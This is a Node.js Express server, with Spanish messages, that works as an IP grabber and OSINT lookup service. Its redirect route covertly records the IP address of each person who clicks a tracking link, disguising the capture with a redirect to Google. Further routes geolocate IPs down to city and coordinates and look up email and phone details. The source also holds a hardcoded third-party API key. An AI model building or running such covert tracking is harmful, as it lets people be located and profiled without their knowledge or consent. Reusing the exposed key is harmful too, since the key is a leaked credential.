const express = require('express');
const cors = require('cors');
const app = express();

const port = process.env.PORT || 10000;
app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// --- RUTAS EXISTENTES ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const user = email.split('@')[0];
    async function verificarLink(url) {
        try { const response = await fetch(url, { method: 'HEAD' }); return response.ok; } catch { return false; }
    }
    try {
        const gravatarExiste = await verificarLink(`https://es.gravatar.com/${user}`);
        res.json({ existe: true, domain: email.split('@')[1], servicios_vinculados: [{ nombre: "Gravatar", link: `https://es.gravatar.com/${user}`, verificado: gravatarExiste }] });
    } catch (error) {
        res.status(500).json({ error: "Error al validar" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
